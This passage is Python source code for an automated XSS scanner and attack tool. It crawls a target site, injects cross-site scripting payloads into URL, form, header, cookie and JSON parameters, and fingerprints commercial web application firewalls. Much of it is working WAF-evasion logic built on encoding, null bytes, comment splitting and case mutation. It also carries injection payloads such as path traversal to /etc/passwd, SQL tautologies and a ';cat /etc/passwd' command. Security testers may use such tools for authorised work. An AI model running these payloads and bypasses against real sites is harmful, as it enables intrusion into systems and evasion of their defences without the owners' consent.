            unicode_encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
            mutations.append(unicode_encoded)
            
            # Hex encoding
            hex_encoded = ''.join([f'\\x{ord(c):02x}' for c in payload])
            mutations.append(hex_encoded)
            
            # Null bytes
            null_variants = [
                payload.replace('>', '\x00>'),
                payload.replace('<', '<\x00'),
                '\x00' + payload,
                payload + '\x00',
            ]
            mutations.extend(null_variants)
            
            # Whitespace variations
            whitespace_chars = ['\t', '\n', '\r', '\f', '\v', '\xa0']
            for ws in whitespace_chars:
                mutated = payload.replace(' ', ws)
                mutations.append(mutated)
            
            # Comment splitting
            comment_variants = [
                payload.replace('script', 'scr/**/ipt'),
                payload.replace('onload', 'on/**/load'),
                payload.replace('alert', 'al/**/ert'),
                payload.replace('=', '/**/='),
                payload.replace('(', '/**/('),
                payload.replace(')', '/**/)'),
            ]
            mutations.extend(comment_variants)
            
            # Line break variations
            linebreak_variants = [
                payload.replace('>', '>\n'),
                payload.replace('<', '\n<'),
                payload.replace('=', '=\n'),
            ]
            mutations.extend(linebreak_variants)
            
            # Extra characters
            extra_char_variants = [
                payload + ' ',
                ' ' + payload,
                payload + '//',
                '/*' + payload + '*/',
            ]
            mutations.extend(extra_char_variants)
            
            # Tab character variations
            tab_variants = [
                payload.replace(' ', '\t'),
                payload.replace('=', '\t='),
                payload.replace('(', '\t('),
            ]
            mutations.extend(tab_variants)
            
            return mutations
        
        @staticmethod
        def generate_context_aware_payloads(param_type):
            """Generate context-aware payloads"""
            payloads = []
            
            if param_type in ['text', 'textarea', 'search']:
                # HTML body context
                payloads.extend([
                    '<script>alert(document.domain)</script>',
                    '<img src=x onerror=alert(document.domain)>',
                    '<svg onload=alert(document.domain)>',
                    '<body onload=alert(document.domain)>',
                ])
            elif param_type in ['url', 'href', 'src', 'action']:
                # URL context
                payloads.extend([
                    'javascript:alert(document.domain)',
                    'data:text/html,<script>alert(document.domain)</script>',
                    'jav&#x61;script:alert(document.domain)',
                ])
            elif param_type in ['email', 'tel', 'number']:
                # Input-specific contexts
                payloads.extend([
                    '" autofocus onfocus=alert(document.domain) x="',
                    "' onmouseover=alert(document.domain) '",
                ])
            
            return payloads

    def extract_js_parameters_enhanced(self, html_content):
        """Enhanced JavaScript parameter extraction"""
        try:
            # Pattern untuk menemukan variabel JavaScript
            js_patterns = [
                r'var\s+(\w+)\s*=\s*["\']?([^"\'\n;]+)["\']?',
                r'let\s+(\w+)\s*=\s*["\']?([^"\'\n;]+)["\']?',
                r'const\s+(\w+)\s*=\s*["\']?([^"\'\n;]+)["\']?',
                r'(\w+)\s*:\s*["\']?([^"\'\n;,}]+)["\']?',
                r'function\s+\w+\s*\(([^)]+)\)',  # Function parameters
                r'\.get\("([^"]+)",',  # AJAX get parameters
                r'\.post\("([^"]+)",',  # AJAX post parameters
                r'params\s*=\s*\{([^}]+)\}',  # Parameters object
                r'data\s*=\s*\{([^}]+)\}',  # Data object
            ]
            
            for pattern in js_patterns:
                matches = re.finditer(pattern, html_content, re.MULTILINE | re.DOTALL)
                for match in matches:
                    if pattern.startswith(r'function'):
                        # Function parameters
                        params_str = match.group(1)
                        param_names = [p.strip() for p in params_str.split(',') if p.strip()]
                        for param_name in param_names:
                            if param_name and param_name not in ['e', 'event', 'i', 'j', 'k', 'x', 'y', 'z', 'temp', 'tmp']:
                                self.discovered_params['json'].append({
                                    'name': f'func_param_{param_name}',
                                    'value': '',
                                    'type': 'javascript',
                                    'context': 'function_parameter'
                                })
                    else:
                        param_name = match.group(1).strip()
                        param_value = match.group(2).strip() if match.group(2) else ''
                        
                        # Skip common JS variables
                        skip_vars = ['i', 'j', 'k', 'x', 'y', 'z', 'temp', 'tmp', 'e', 'event', 
                                    'err', 'error', 'res', 'response', 'req', 'request', 'data']
                        
                        if (param_name and 
                            param_name not in skip_vars and
                            len(param_name) > 1 and
                            not param_name.startswith('_')):
                            
                            self.discovered_params['json'].append({
                                'name': f'js_var_{param_name}',
                                'value': param_value,
                                'type': 'javascript',
                                'context': 'variable'
                            })
                            
        except Exception as e:
            logger.debug(f"JS parameter extraction error: {e}")

    def extract_html_attributes(self, html_content):
        """Extract parameters from HTML attributes"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Cari semua atribut yang mungkin mengandung parameter
            for tag in soup.find_all(True):  # True means all tags
                for attr, value in tag.attrs.items():
                    if isinstance(value, str) and value:
                        # Check for URL parameters in href/src
                        if attr in ['href', 'src', 'action', 'data-src', 'data-href']:
                            parsed = urlparse(value)
                            if parsed.query:
                                query_params = parse_qs(parsed.query)
                                for param_name in query_params:
                                    self.discovered_params['url'].append({
                                        'name': param_name,
                                        'value': query_params[param_name][0] if query_params[param_name] else '',
                                        'type': 'url',
                                        'source': f'{tag.name}[{attr}]'
                                    })
                        
                        # Check for data-* attributes that might be parameters
                        elif attr.startswith('data-') and len(value) < 100:
                            param_name = attr[5:]  # Remove 'data-' prefix
                            self.discovered_params['json'].append({
                                'name': f'data_{param_name}',
                                'value': value,
                                'type': 'html',
                                'context': 'data_attribute'
                            })
                            
        except Exception as e:
            logger.debug(f"HTML attribute extraction error: {e}")

    def enhanced_crawl_v2(self, html_content):
        """Improved crawling with better link discovery"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            visited_urls = set([self.target_url])
            urls_to_visit = []
            
            # Collect all links with better filtering
            for link in soup.find_all(['a', 'link', 'area'], href=True):
                href = link['href']
                if href and not href.startswith(('#', 'mailto:', 'tel:', 'javascript:', 'data:')):
                    full_url = urllib.parse.urljoin(self.target_url, href)
                    
                    # Check if same domain
                    if urllib.parse.urlparse(full_url).netloc == urllib.parse.urlparse(self.target_url).netloc:
                        if full_url not in visited_urls:
                            urls_to_visit.append(full_url)
                            visited_urls.add(full_url)
            
            # Collect all form actions
            for form in soup.find_all('form', action=True):
                action = form['action']
                if action:
                    full_url = urllib.parse.urljoin(self.target_url, action)
                    if full_url not in visited_urls:
                        urls_to_visit.append(full_url)
                        visited_urls.add(full_url)
            
            # Collect all script/src sources
            for tag in soup.find_all(['script', 'img', 'iframe', 'frame', 'embed'], src=True):
                src = tag['src']
                if src and not src.startswith(('data:', 'javascript:')):
                    full_url = urllib.parse.urljoin(self.target_url, src)
                    if urllib.parse.urlparse(full_url).netloc == urllib.parse.urlparse(self.target_url).netloc:
                        if full_url not in visited_urls:
                            urls_to_visit.append(full_url)
                            visited_urls.add(full_url)
            
            # Limit crawling depth
            max_crawl = min(self.options.get('max_crawl', 10), len(urls_to_visit))
            urls_to_visit = urls_to_visit[:max_crawl]
            
            if urls_to_visit:
                print(f"[*] Crawling {len(urls_to_visit)} additional pages...")
            
            for i, url in enumerate(urls_to_visit):
                try:
                    print(f"\r  Crawling page {i+1}/{len(urls_to_visit)}", end='', flush=True)
                    
                    resp = self.session.get(url, timeout=5, verify=False)
                    self.stats['requests_sent'] += 1
                    
                    # Extract parameters from new page
                    self.discovered_params['url'].extend(self.extract_url_parameters(resp.url))
                    self.discovered_params['form'].extend(self.extract_form_parameters(resp.text))
                    self.extract_js_parameters_enhanced(resp.text)
                    self.extract_html_attributes(resp.text)
                    
                    # Brief pause to avoid rate limiting
                    time.sleep(0.5)
                    
                except Exception as e:
                    logger.debug(f"Crawl error for {url}: {e}")
                    continue
            
            if urls_to_visit:
                print()  # New line after progress
                
        except Exception as e:
            logger.debug(f"Crawling error: {e}")

    def try_waf_bypass_enhanced(self, param_info, original_payload, blocked_response):
        """Enhanced WAF bypass with multi-strategy approach"""
        
        # Skip WAF bypass jika --no-waf flag aktif
        if self.no_waf_mode:
            print(f"    {Fore.YELLOW}[!] WAF bypass skipped (--no-waf flag){Fore.RESET}")
            return None
        
        print(f"    {Fore.YELLOW}[!] WAF detected, trying enhanced bypass techniques...{Fore.RESET}")
        
        # Strategy 1: Basic encoding bypasses
        basic_bypasses = []
        
        # HTML entity encoding
        basic_bypasses.append(original_payload.replace('<', '&lt;').replace('>', '&gt;'))
        basic_bypasses.append(original_payload.replace('<', '&#60;').replace('>', '&#62;'))
        basic_bypasses.append(original_payload.replace('<', '&#x3c;').replace('>', '&#x3e;'))
        
        # URL encoding
        basic_bypasses.append(quote(original_payload))
        basic_bypasses.append(quote(original_payload, safe=''))
        
        # Double URL encoding
        basic_bypasses.append(quote(quote(original_payload)))
        
        # Unicode encoding
        unicode_payload = ''.join([f'\\u{ord(c):04x}' for c in original_payload])
        basic_bypasses.append(unicode_payload)
        
        # Hex encoding
        hex_payload = ''.join([f'\\x{ord(c):02x}' for c in original_payload])
        basic_bypasses.append(hex_payload)
        
        # Strategy 2: Case and whitespace manipulation
        case_bypasses = []
        words = re.findall(r'[a-zA-Z]+', original_payload)
        for word in words:
            if len(word) > 3:
                # Random case
                random_case = ''.join(random.choice([c.upper(), c.lower()]) for c in word)
                case_bypasses.append(original_payload.replace(word, random_case))
                
                # Insert null bytes
                null_case = word[:len(word)//2] + '\x00' + word[len(word)//2:]
                case_bypasses.append(original_payload.replace(word, null_case))
                
                # Insert comments
                commented = word[:len(word)//2] + '/**/' + word[len(word)//2:]
                case_bypasses.append(original_payload.replace(word, commented))
        
        # Strategy 3: Tag and attribute variations
        tag_bypasses = []
        if '<script>' in original_payload:
            tag_variations = [
                original_payload.replace('<script>', '<script type="text/javascript">'),
                original_payload.replace('<script>', '<script language="javascript">'),
                original_payload.replace('<script>', '<script//>'),
                original_payload.replace('<script>', '<script/random="attr">'),
            ]
            tag_bypasses.extend(tag_variations)
        
        # Strategy 4: Event handler variations
        event_bypasses = []
        event_handlers = ['onload', 'onerror', 'onclick', 'onmouseover']
        for handler in event_handlers:
            if handler in original_payload:
                # Different quoting styles
                event_bypasses.append(original_payload.replace(f'{handler}=', f'{handler}="'))
                event_bypasses.append(original_payload.replace(f'{handler}=', f"{handler}='"))
                event_bypasses.append(original_payload.replace(f'{handler}=', f'{handler}=`'))
                
                # With spaces
                event_bypasses.append(original_payload.replace(f'{handler}=', f' {handler}= '))
        
        # Combine all strategies
        all_bypasses = list(set(basic_bypasses + case_bypasses + tag_bypasses + event_bypasses))
        
        # Limit bypass attempts
        max_bypass = min(20, len(all_bypasses))
        test_bypasses = all_bypasses[:max_bypass]
        
        successful_bypasses = []
        
        for i, bypass_payload in enumerate(test_bypasses):
            try:
                # Add increasing delay to avoid rate limiting
                time.sleep(0.5 + (i * 0.1))
                
                print(f"\r    Testing bypass {i+1}/{len(test_bypasses)}", end='', flush=True)
                
                response = self.send_request_with_payload(param_info, bypass_payload)
                self.stats['requests_sent'] += 1
                
                # Check if response is not blocked
                if response.status_code not in [403, 406, 418, 419, 429, 500, 501, 503]:
                    if not self.is_waf_blocked(response):
                        successful_bypasses.append({
                            'payload': bypass_payload,
                            'response': response
                        })
                        
                        # Check for reflection
                        reflection_contexts = self.detect_reflection_points(
                            param_info['name'], bypass_payload, response.text
                        )
                        
                        if reflection_contexts:
                            for context in reflection_contexts:
                                if self.is_exploitable(context, bypass_payload, response.text):
                                    vulnerability = self.create_vulnerability_record(
                                        param_info, bypass_payload, context, response
                                    )
                                    vulnerability['waf_bypassed'] = True
                                    vulnerability['original_payload'] = original_payload
                                    vulnerability['bypass_technique'] = 'waf_bypass'
                                    
                                    if self.verify_vulnerability(vulnerability):
                                        return vulnerability
                
            except requests.exceptions.ConnectionError:
                print(f"\r    {Fore.YELLOW}[!] Connection error{Fore.RESET}")
                time.sleep(2)
                continue
            except Exception as e:
                logger.debug(f"Bypass error: {e}")
                continue
        
        print()  # New line after progress
        
        if successful_bypasses:
            print(f"    {Fore.GREEN}[+] {len(successful_bypasses)} bypasses successful (no XSS found){Fore.RESET}")
        else:
            print(f"    {Fore.RED}[!] All bypass attempts failed{Fore.RESET}")
        
        return None
    
    # ==============================
    # 4. ENHANCED TESTING ENGINE
    # ==============================
    
    def test_parameter(self, param_info, test_mode='classic'):
        """
        Enhanced parameter testing with better error handling
        """
        if isinstance(param_info, str):
            logger.error(f"Invalid param_info: {param_info}")
            return None
        
        param_name = param_info.get('name', 'unknown')
        param_type = param_info.get('type', 'url')
        
        print(f"  [~] Testing {param_type} parameter: {param_name}")
        
        try:
            # Select payloads based on test mode
            if test_mode == 'classic':
                payloads = self.get_classic_payloads(param_info)
            elif test_mode == 'dom':
                payloads = self.get_dom_payloads(param_info)
            elif test_mode == 'blind':
                payloads = self.get_blind_payloads(param_info)
            elif test_mode == 'advanced':
                payloads = self.get_advanced_payloads(param_info)
            else:
                payloads = self.get_classic_payloads(param_info)
            
            # Limit payloads for performance
            max_payloads = self.options.get('max_payloads', 30)  # Reduced from 50
            if len(payloads) > max_payloads:
                payloads = payloads[:max_payloads]
            
            # Test each payload
            for i, payload in enumerate(payloads):
                try:
                    # Skip if payload was filtered before
                    payload_hash = hashlib.md5(payload.encode()).hexdigest()
                    if payload_hash in self.payload_history.get('filtered', set()):
                        continue
                    
                    # Check if payload might be blocked by WAF pattern (skip jika --no-waf)
                    if not self.no_waf_mode and self.is_likely_blocked_by_waf(payload):
                        self.stats['waf_blocks'] += 1
                        self.payload_history.setdefault('filtered', set()).add(payload_hash)
                        self.stats['filtered_payloads'] += 1
                        continue
                    
                    # Send request with payload
                    response = self.send_request_with_payload(param_info, payload)
                    self.stats['requests_sent'] += 1
                    
                    # Check for actual WAF blocking (skip jika --no-waf)
                    if not self.no_waf_mode and self.is_waf_blocked(response):
                        self.stats['waf_blocks'] += 1
                        
                        # Verify it's actually WAF, not connection issue
                        if self.verify_waf_block(response):
                            # Try enhanced WAF bypass
                            bypassed = self.try_waf_bypass_enhanced(param_info, payload, response)
                            if bypassed:
                                return bypassed
                        
                        # Mark payload as filtered
                        self.payload_history.setdefault('filtered', set()).add(payload_hash)
                        self.stats['filtered_payloads'] += 1
                        continue
                    
                    # Detect reflection points
                    reflection_contexts = self.detect_reflection_points(param_name, payload, response.text)
                    
                    if reflection_contexts:
                        # Analyze if reflection is exploitable
                        for context in reflection_contexts:
                            if self.is_exploitable(context, payload, response.text):
                                vulnerability = self.create_vulnerability_record(
                                    param_info, payload, context, response
                                )
                                
                                # Verify the vulnerability
                                if self.verify_vulnerability(vulnerability):
                                    return vulnerability
                    
                    # DOM analysis
                    if test_mode in ['classic', 'dom', 'advanced']:
                        dom_vulns = self.analyze_dom(response.text, param_name, payload)
                        if dom_vulns:
                            return dom_vulns[0]
                    
                    # Rate limiting
                    delay = self.options.get('delay', 0.2)  # Increased delay
                    if delay > 0:
                        time.sleep(delay)
                    
                    # Progress indicator for long tests
                    if i % 5 == 0:  # More frequent updates
                        print(f"\r    Progress: {i+1}/{len(payloads)} payloads", end='', flush=True)
                        
                except requests.exceptions.ConnectionError as e:
                    # Handle connection errors
                    logger.debug(f"Connection error for payload {payload[:50]}: {e}")
                    print(f"\r    {Fore.YELLOW}[!] Connection error, waiting...{Fore.RESET}")
                    time.sleep(3)  # Wait longer for connection issues
                    continue
                except Exception as e:
                    logger.debug(f"Error with payload {payload[:50]}: {e}")
                    continue
            
            print(f"\r    Tested {len(payloads)} payloads - No vulnerability found", flush=True)
            print()
            
        except Exception as e:
            logger.error(f"Error testing parameter {param_name}: {e}")
            print(f"    {Fore.RED}[!] Error: {e}{Fore.RESET}")
        
        return None

    def is_likely_blocked_by_waf(self, payload):
        """Check if payload is likely to be blocked by common WAF patterns"""
        
        # Skip WAF filtering jika --no-waf flag aktif
        if self.no_waf_mode:
            return False
        # Common WAF blocking patterns
        suspicious_patterns = [
            r'<script.*>.*alert.*</script>',  # Basic script alerts
            r'javascript:.*alert',            # javascript: URLs
            r'onload\s*=',                     # Event handlers
            r'onerror\s*=',
            r'onclick\s*=',
            r'<svg.*onload=',                 # SVG with onload
            r'eval\s*\(',                      # eval() calls
            r'document\.write',                # document.write
            r'innerHTML\s*=',                  # innerHTML
            r'<iframe.*src=',                 # iframe with src
            r'<embed.*src=',                  # embed with src
            r'<object.*data=',                # object with data
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return True
        
        # Check for too many special characters
        special_chars = ['<', '>', '"', "'", '`', '(', ')', '{', '}', '[', ']']
        special_count = sum(1 for char in payload if char in special_chars)
        if special_count > 10:  # Too many special characters
            return True
        
        return False

    def verify_waf_block(self, response):
        """Verify if response is actually from WAF, not just connection issue"""
        # Check if response has valid content
        if response.status_code == 0 or not response.text:
            return False
        
        # WAF usually returns specific status codes
        waf_codes = [403, 406, 418, 419, 429, 451, 500, 501, 503]
        if response.status_code in waf_codes:
            return True
        
        # Check for WAF-specific patterns in response
        waf_indicators = [
            r'access\s+denied',
            r'security.*violation',
            r'web\s+application\s+firewall',
            r'blocked.*security',
            r'malicious.*activity',
            r'suspicious.*request',
            r'forbidden',
            r'not.*permitted',
            r'intrusion.*detection',
        ]
        
        for pattern in waf_indicators:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False

    def try_waf_bypass(self, param_info, original_payload, blocked_response):
        """Improved WAF bypass with smarter techniques"""
        print(f"    {Fore.YELLOW}[!] WAF detected, trying smarter bypass...{Fore.RESET}")
        
        # First, analyze what might be triggering the WAF
        triggering_patterns = self.analyze_blocked_payload(original_payload)
        
        # Generate targeted bypass payloads based on analysis
        bypass_payloads = []
        
        # Try different encoding strategies
        if '<script>' in original_payload:
            bypass_payloads.extend([
                original_payload.replace('<script>', '&lt;script&gt;'),
                original_payload.replace('<script>', '%3Cscript%3E'),
                original_payload.replace('<script>', '\x3Cscript\x3E'),
                original_payload.replace('<script>', '\u003cscript\u003e'),
            ])
        
        # Try case variations for keywords
        keywords = ['script', 'alert', 'onload', 'onerror', 'javascript']
        for keyword in keywords:
            if keyword in original_payload.lower():
                # Random case
                import random
                random_case = ''.join(random.choice([c.upper(), c.lower()]) for c in keyword)
                bypass_payloads.append(original_payload.replace(keyword, random_case))
                
                # Insert comments
                if len(keyword) > 3:
                    mid = len(keyword) // 2
                    commented = keyword[:mid] + '/**/' + keyword[mid:]
                    bypass_payloads.append(original_payload.replace(keyword, commented))
        
        # Try fragmentation
        if len(original_payload) > 20:
            parts = [original_payload[i:i+10] for i in range(0, len(original_payload), 10)]
            fragmented = ''.join(parts)
            bypass_payloads.append(fragmented)
        
        # Add null bytes
        bypass_payloads.append(original_payload.replace('>', '\x00>'))
        bypass_payloads.append(original_payload.replace('<', '<\x00'))
        
        # Add extra whitespace
        bypass_payloads.append(original_payload.replace(' ', '\t'))
        bypass_payloads.append(original_payload.replace(' ', '\n'))
        bypass_payloads.append(original_payload.replace(' ', '\r'))
        
        # Limit bypass attempts
        max_bypass = min(15, len(bypass_payloads))
        bypass_payloads = bypass_payloads[:max_bypass]
        
        successful_bypasses = 0
        
        for bypass_payload in bypass_payloads:
            try:
                # Add small delay to avoid rate limiting
                time.sleep(0.5)
                
                response = self.send_request_with_payload(param_info, bypass_payload)
                self.stats['requests_sent'] += 1
                
                if not self.is_waf_blocked(response):
                    print(f"    {Fore.GREEN}[✓] Bypass successful!{Fore.RESET}")
                    successful_bypasses += 1
                    
                    # Check if payload is reflected
                    reflection_contexts = self.detect_reflection_points(
                        param_info['name'], bypass_payload, response.text
                    )
                    
                    if reflection_contexts:
                        for context in reflection_contexts:
                            if self.is_exploitable(context, bypass_payload, response.text):
                                vulnerability = self.create_vulnerability_record(
                                    param_info, bypass_payload, context, response
                                )
                                vulnerability['waf_bypassed'] = True
                                vulnerability['original_payload'] = original_payload
                                vulnerability['bypass_technique'] = 'waf_bypass'
                                
                                if self.verify_vulnerability(vulnerability):
                                    return vulnerability
                
            except requests.exceptions.ConnectionError:
                print(f"\r    {Fore.YELLOW}[!] Connection error during bypass{Fore.RESET}")
                time.sleep(2)
                continue
            except Exception as e:
                logger.debug(f"Bypass error: {e}")
                continue
        
        if successful_bypasses > 0:
            print(f"    {Fore.GREEN}[+] {successful_bypasses} bypasses worked but no XSS{Fore.RESET}")
        else:
            print(f"    {Fore.RED}[!] All bypass attempts failed{Fore.RESET}")
        
        return None

    def analyze_blocked_payload(self, payload):
        """Analyze which part of payload might be triggering WAF"""
        patterns = []
        
        # Check for common WAF triggers
        triggers = {
            'script_tag': r'<script.*>',
            'alert_call': r'alert\s*\(.*\)',
            'javascript_url': r'javascript:.*',
            'event_handler': r'on\w+\s*=',
            'svg_tag': r'<svg.*>',
            'iframe_tag': r'<iframe.*>',
            'eval_call': r'eval\s*\(',
        }
        
        for trigger_name, pattern in triggers.items():
            if re.search(pattern, payload, re.IGNORECASE):
                patterns.append(trigger_name)
        
        return patterns
    
    def get_advanced_payloads(self, param_info):
        """Get advanced payloads"""
        payloads = []
        
        # Combine all payload types
        payloads.extend(self.payload_db.get('basic', []))
        payloads.extend(self.payload_db.get('advanced', []))
        payloads.extend(self.payload_db.get('waf_bypass', []))
        payloads.extend(self.payload_db.get('polyglot', []))
        
        # Context-aware payloads
        param_type = param_info.get('type', 'url')
        if param_type == 'url':
            payloads.extend(self.payload_db.get('url', []))
        elif param_type in ['form', 'text', 'textarea']:
            payloads.extend(self.payload_db.get('attribute', []))
        
        return list(OrderedDict.fromkeys(payloads))[:100]
    
    def try_waf_bypass(self, param_info, original_payload, blocked_response):
        """Improved WAF bypass with smarter techniques"""
        
        # Skip WAF bypass jika --no-waf flag aktif
        if self.no_waf_mode:
            print(f"    {Fore.YELLOW}[!] WAF bypass skipped (--no-waf flag){Fore.RESET}")
            return None
        
        print(f"    {Fore.YELLOW}[!] WAF detected, trying smarter bypass...{Fore.RESET}")
        
        # Generate bypass payloads
        bypass_payloads = self.PayloadMutator.mutate_for_context(
            original_payload, 
            param_info.get('context', 'html_body'),
            self.waf_type
        )
        
        # Also try WAF-specific mutations
        if self.waf_type:
            bypass_payloads.extend(
                self.PayloadMutator.waf_specific_mutations(original_payload, self.waf_type)
            )
        
        # Try advanced mutations
        bypass_payloads.extend(self.PayloadMutator.advanced_mutations(original_payload))
        
        # Limit bypass attempts
        max_bypass = min(20, len(bypass_payloads))
        bypass_payloads = bypass_payloads[:max_bypass]
        
        for bypass_payload in bypass_payloads:
            try:
                response = self.send_request_with_payload(param_info, bypass_payload)
                self.stats['requests_sent'] += 1
                
                if not self.is_waf_blocked(response):
                    print(f"    {Fore.GREEN}[✓] WAF bypass successful!{Fore.RESET}")
                    
                    # Check if payload is reflected
                    reflection_contexts = self.detect_reflection_points(
                        param_info['name'], bypass_payload, response.text
                    )
                    
                    if reflection_contexts:
                        for context in reflection_contexts:
                            if self.is_exploitable(context, bypass_payload, response.text):
                                vulnerability = self.create_vulnerability_record(
                                    param_info, bypass_payload, context, response
                                )
                                vulnerability['waf_bypassed'] = True
                                vulnerability['original_payload'] = original_payload
                                
                                if self.verify_vulnerability(vulnerability):
                                    return vulnerability
                
                time.sleep(self.options.get('delay', 0.1))
                
            except Exception as e:
                continue
        
        return None
    
    def send_request_with_payload(self, param_info, payload):
        """
        Enhanced request sending with better error handling
        """
        try:
            param_name = param_info.get('name', 'test')
            param_type = param_info.get('type', 'url')
            
            if param_type in ['url', 'query', 'path']:
                return self._inject_url_param(param_info, payload)
            elif param_type == 'form':
                return self._inject_form_param(param_info, payload)
            elif param_type == 'header':
                return self._inject_header_param(param_info, payload)
            elif param_type == 'cookie':
                return self._inject_cookie_param(param_info, payload)
            elif param_type in ['json', 'ajax']:
                return self._inject_json_param(param_info, payload)
            else:
                # Default to URL parameter injection
                return self._inject_url_param(param_info, payload)
                
        except Exception as e:
            logger.error(f"Error sending request: {e}")
            # Return a dummy response to prevent crashes
            class DummyResponse:
                status_code = 0
                text = ''
                url = self.target_url
                headers = {}
            
            return DummyResponse()
    
    def _inject_url_param(self, param_info, payload):
        """Inject payload into URL parameter"""
        parsed = urlparse(self.target_url)
        query_params = parse_qs(parsed.query)
        
        # Handle path parameters
        if param_info.get('type') == 'path':
            # Replace in path
            path_segments = parsed.path.split('/')
            param_index = param_info.get('index', -1)
            if 0 <= param_index < len(path_segments):
                path_segments[param_index] = payload
                new_path = '/'.join(path_segments)
                new_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                if parsed.query:
                    new_url += f"?{parsed.query}"
                return self.session.get(new_url, timeout=self.options.get('timeout', 10))
        
        # Handle query parameters
        param_name = param_info['name']
        query_params[param_name] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        return self.session.get(new_url, timeout=self.options.get('timeout', 10))
    
    def _inject_form_param(self, param_info, payload):
        """Inject payload into form parameter"""
        form_method = param_info.get('form_method', 'get').lower()
        form_action = param_info.get('form_action', self.target_url)
        
        if form_action and not form_action.startswith(('http://', 'https://')):
            form_action = urllib.parse.urljoin(self.target_url, form_action)
        
        data = {param_info['name']: payload}
        
        if form_method == 'post':
            return self.session.post(form_action, data=data, timeout=self.options.get('timeout', 10))
        else:
            return self.session.get(form_action, params=data, timeout=self.options.get('timeout', 10))
    
    def _inject_header_param(self, param_info, payload):
        """Inject payload into header"""
        headers = {param_info['name']: payload}
        return self.session.get(self.target_url, headers=headers, timeout=self.options.get('timeout', 10))
    
    def _inject_cookie_param(self, param_info, payload):
        """Inject payload into cookie"""
        self.session.cookies.set(param_info['name'], payload)
        return self.session.get(self.target_url, timeout=self.options.get('timeout', 10))
    
    def _inject_json_param(self, param_info, payload):
        """Inject payload into JSON parameter"""
        # This is a simplified version
        data = {param_info['name']: payload}
        headers = {'Content-Type': 'application/json'}
        
        # Try both GET and POST
        try:
            return self.session.post(self.target_url, json=data, headers=headers, 
                                   timeout=self.options.get('timeout', 10))
        except:
            return self.session.get(self.target_url, params=data, 
                                  timeout=self.options.get('timeout', 10))
    
    # ==============================
    # 5. CONCURRENT TESTING ENGINE
    # ==============================
    
    def concurrent_testing(self, parameters, test_mode='classic'):
        """
        Enhanced concurrent testing with better progress tracking
        """
        print(f"\n{Fore.GREEN}[*] Starting concurrent testing ({test_mode} mode){Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")
        
        vulnerabilities = []
        futures = []
        
        # Filter invalid parameters
        valid_params = []
        for param in parameters:
            if isinstance(param, dict) and 'name' in param:
                valid_params.append(param)
            else:
                logger.warning(f"Skipping invalid parameter: {param}")
        
        if not valid_params:
            print(f"{Fore.YELLOW}[!] No valid parameters to test{Fore.RESET}")
            return vulnerabilities
        
        # Submit tasks to thread pool
        for param_info in valid_params:
            future = self.thread_pool.submit(self.test_parameter, param_info, test_mode)
            futures.append((future, param_info))
        
        # Collect results with progress tracking
        completed = 0
        total = len(futures)
        
        for future, param_info in futures:
            try:
                result = future.result(timeout=self.options.get('timeout', 10) * 5)
                
                if result:
                    vulnerabilities.append(result)
                    self.display_vulnerability(result)
                
            except Exception as e:
                logger.error(f"Error testing {param_info.get('name', 'unknown')}: {e}")
            
            completed += 1
            progress = (completed / total) * 100
            
            # Update progress
            sys.stdout.write(f"\r    Progress: {completed}/{total} ({progress:.1f}%)")
            sys.stdout.flush()
        
        print()  # New line after progress
        
        return vulnerabilities
    
    # ==============================
    # 6. ENHANCED WAF DETECTION
    # ==============================
    
    
    def detect_waf(self):
        """Enhanced WAF detection with fingerprinting"""
        
        # Skip WAF detection jika --no-waf flag aktif
        if self.no_waf_mode:
            print(f"\n{Fore.GREEN}[6] WAF DETECTION SKIPPED (--no-waf flag){Fore.RESET}")
            print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")
            print(f"[+] {Fore.YELLOW}WAF detection and bypass disabled as requested{Fore.RESET}")
            self.waf_detected = False
            self.waf_type = "Disabled by user"
            return self.waf_type
        
        print(f"\n{Fore.GREEN}[6] WAF DETECTION & FINGERPRINTING{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")
        
        waf_signatures = {
            'Cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id'],
                'cookies': ['__cfduid', '__cflb'],
                'server': ['cloudflare'],
                'body': ['Cloudflare', 'cf-error'],
            },
            'ModSecurity': {
                'headers': [],
                'cookies': [],
                'server': ['mod_security', 'Mod_Security', 'OWASP_CRS'],
                'body': ['ModSecurity', 'OWASP', 'CRS'],
            },
            'AWS WAF': {
                'headers': ['x-amz-id-2', 'x-amz-request-id'],
                'cookies': ['aws-waf-token'],
                'server': ['awselb/2.0', 'AWS', 'Amazon'],
                'body': ['Request blocked', 'AWS WAF'],
            },
            'Akamai': {
                'headers': ['x-akamai-transformed', 'akamai-origin-hop'],
                'cookies': ['ak_bmsc'],
                'server': ['Akamai', 'akamaighost'],
                'body': ['Akamai', 'Ghost'],
            },
            'Imperva': {
                'headers': ['x-cdn', 'incap-su'],
                'cookies': ['visid_incap_'],
                'server': ['Imperva', 'incapsula'],
                'body': ['Imperva', 'incapsula'],
            },
            'F5 BIG-IP': {
                'headers': ['x-wa-info', 'BIGipServer'],
                'cookies': ['BIGipServer'],
                'server': ['BigIP', 'F5'],
                'body': ['BIG-IP', 'F5'],
            },
            'FortiWeb': {
                'headers': ['x-fortiweb'],
                'cookies': [],
                'server': ['FortiWeb'],
                'body': ['FortiWeb', 'Fortinet'],
            },
            'Barracuda': {
                'headers': ['barracuda'],
                'cookies': [],
                'server': ['Barracuda'],
                'body': ['Barracuda'],
            },
            'Sucuri': {
                'headers': ['x-sucuri-id', 'x-sucuri-cache'],
                'cookies': ['sucuri_cloudproxy_uuid_'],
                'server': ['Sucuri'],
                'body': ['Sucuri', 'Cloudproxy'],
            },
        }
        
        test_payloads = [
            '<script>alert(1)</script>',
            '../../../../etc/passwd',
            "' OR '1'='1",
            '<svg onload=alert(1)>',
            '${@print(md5(1234))}',
            ';cat /etc/passwd',
        ]
        
        detected_wafs = set()
        
        for payload in test_payloads[:3]:  # Test first 3 payloads
            try:
                response = self.session.get(
                    self.target_url, 
                    params={'waf_test': payload},
                    timeout=5
                )
